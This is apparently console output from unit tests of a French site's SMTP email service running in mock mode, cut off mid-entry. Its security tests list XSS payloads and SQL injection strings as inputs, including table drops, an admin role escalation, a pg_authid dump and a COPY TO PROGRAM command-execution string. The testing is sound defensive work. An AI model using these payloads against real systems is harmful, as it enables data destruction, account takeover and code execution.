[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send email with HTML
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506919-0.9199362314986046'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'HTML Email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send email with custom from
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send email with custom from
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506923-0.8519540699453003'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Custom From'[39m,
  from: [32m'sender@example.com'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send email with replyTo
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send email with replyTo
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506930-0.2811247661857956'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Reply To Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid recipient email
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid sender email
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould require subject
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould require content (text or html)
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject subject longer than 998 chars
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: not-an-email
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: @example.com
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: user@
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: user@@example.com
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: user @example.com
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: user@example
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: 
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould accept valid email: user@example.com
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould accept valid email: user@example.com
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506965-0.58149061407748'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <script>alert(1)</script>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <script>alert(1)</script>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506967-0.9004389120878211'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'<script>alert(1)</script>'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: "<script>alert(1)</script>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: "<script>alert(1)</script>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506969-0.8887431108654023'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'"<script>alert(1)</script>'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: '-alert(1)-'
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: '-alert(1)-'
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506972-0.7084711419190546'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m"'-alert(1)-'"[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <img src=x onerror=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <img src=x onerror=alert(1)>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506975-0.8168278372640716'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'<img src=x onerror=alert(1)>'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: javascript:alert(1)
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: javascript:alert(1)
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506978-0.060810496951551274'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'javascript:alert(1)'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: ${alert(1)}
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: ${alert(1)}
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506980-0.48646469507818213'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'${alert(1)}'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: {{constructor.constructor("alert(1)")()}}
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: {{constructor.constructor("alert(1)")()}}
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506982-0.9535694751042245'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'{{constructor.constructor("alert(1)")()}}'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <iframe src="javascript:alert(1)"></iframe>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <iframe src="javascript:alert(1)"></iframe>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506985-0.6741494336413012'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'<iframe src="javascript:alert(1)"></iframe>'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <body onload=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <body onload=alert(1)>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506986-0.2981120148034526'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'<body onload=alert(1)>'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <input onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <input onfocus=alert(1) autofocus>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506988-0.5453011297444563'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'<input onfocus=alert(1) autofocus>'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <select onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <select onfocus=alert(1) autofocus>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506991-0.5912013429066298'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'<select onfocus=alert(1) autofocus>'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <textarea onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <textarea onfocus=alert(1) autofocus>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506994-0.10385668572864559'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'<textarea onfocus=alert(1) autofocus>'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <marquee onstart=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <marquee onstart=alert(1)>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506996-0.5728775409061089'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'<marquee onstart=alert(1)>'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <div style="background:url(javascript:alert(1))">
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <div style="background:url(javascript:alert(1))">
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506998-0.1880730055773474'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'<div style="background:url(javascript:alert(1))">'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <script>alert(1)</script>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <script>alert(1)</script>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507000-0.4380188969367369'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: "<script>alert(1)</script>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: "<script>alert(1)</script>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507002-0.021954568847805334'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: '-alert(1)-'
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: '-alert(1)-'
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507004-0.35234012434032747'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <img src=x onerror=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <img src=x onerror=alert(1)>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507006-0.8247672973956954'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: javascript:alert(1)
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: javascript:alert(1)
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507008-0.8481697217519535'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: ${alert(1)}
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: ${alert(1)}
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507010-0.3088432872064715'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: {{constructor.constructor("alert(1)")()}}
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: {{constructor.constructor("alert(1)")()}}
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507012-0.1657310409299153'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <iframe src="javascript:alert(1)"></iframe>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <iframe src="javascript:alert(1)"></iframe>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507014-0.6741170631428219'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <body onload=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <body onload=alert(1)>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507016-0.0676226130167561'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <input onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <input onfocus=alert(1) autofocus>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507019-0.04369696553248459'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <select onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <select onfocus=alert(1) autofocus>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507021-0.9092572865285331'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <textarea onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <textarea onfocus=alert(1) autofocus>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507023-0.2151951589582588'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <marquee onstart=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <marquee onstart=alert(1)>
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507026-0.27243776359687355'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <div style="background:url(javascript:alert(1))">
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <div style="background:url(javascript:alert(1))">
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507032-0.035249767678388055'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: '; DROP TABLE user; --
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: ' OR '1'='1
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: '; DELETE FROM user WHERE '1'='1'; --
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: 1'; UPDATE user SET role='admin' WHERE '1'='1
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: ' UNION SELECT * FROM pg_authid --
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: '; COPY (SELECT '') TO PROGRAM 'id'; --
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: admin'--
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: ' or 1=1--
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: ') OR ('1'='1
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - Null Bytes[2m > [22m[2mshould reject null bytes: test <script>alert(1)</script>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - Null Bytes[2m > [22m[2mshould reject null bytes: admin .php
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - Null Bytes[2m > [22m[2mshould accept valid email without null byte: user@example.com
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - Null Bytes[2m > [22m[2mshould accept valid email without null byte: user@example.com
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507071-0.9345014796506439'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould send batch emails
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould send batch emails
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507074-0.14797526546111417'[39m,
  to: [32m'user1@example.com'[39m,
  subject: [32m'Test 1'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}
[MOCK SMTP] {
  messageId: [32m'mock-1772463507074-0.9518742828889'[39m,
  to: [32m'user2@example.com'[39m,
